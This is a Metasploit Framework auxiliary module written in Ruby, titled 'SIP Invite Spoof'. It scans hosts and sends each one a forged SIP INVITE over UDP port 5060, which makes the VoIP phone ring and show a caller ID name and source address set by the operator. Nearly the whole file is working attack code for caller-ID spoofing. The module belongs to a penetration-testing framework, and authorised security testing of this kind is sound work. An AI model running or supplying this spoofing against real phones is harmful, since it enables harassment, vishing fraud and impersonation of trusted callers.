##
# $Id:$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Auxiliary::Voip::SipSpoof < Msf::Auxiliary
        
	include Exploit::Remote::Udp
	include Auxiliary::Scanner
	
	def initialize
		super(
			'Name'           => 'SIP Invite Spoof',
			'Version'        => '$Revision$',
			'Description'    => 'This module will create a fake SIP invite request making the targeted device ring and display fake caller id information.',
			'Author'         => 'David Maynor <dave@erratasec.com>',
			'License'        =>  MSF_LICENSE
		)
		
		deregister_options('Proxies','SSL','RHOST')
		register_options(
			[
				Opt::RPORT(5060),
				OptString.new('SRCADDR', [true, "The sip address the spoofed call is coming from",'192.168.1.1']),
				OptString.new('MSG', [true, "The spoofed caller id to send","The Metasploit has you"])
			], self.class)
	end


	def run_host(ip)
		
		begin
		
		name=datastore['MSG']
		src=datastore['SRCADDR']
		connect_udp

		print_status("Sending Fake SIP Invite to: #{ip}")
                req  =   "INVITE sip:@127.0.0.1 SIP/2.0" + "\r\n"
                req  <<  "To: <sip:#{ip}>" + "\r\n"
                req  <<  "Via: SIP/2.0/UDP #{ip}" + "\r\n"
                req  <<  "From: \"#{name}\"<sip:#{src}>" + "\r\n"
                req  <<  "Call-ID: #{(rand(100)+100).to_s}#{ip}" + "\r\n"
                req  <<  "CSeq: 1 INVITE" + "\r\n"
                req  <<  "Max-Forwards: 20" +  "\r\n"
                req  <<  "Contact: <sip:127.0.0.1>" + "\r\n\r\n"
		udp_sock.put(req)
		disconnect_udp
	
		rescue Errno::EACCES
		end
	end
end
end
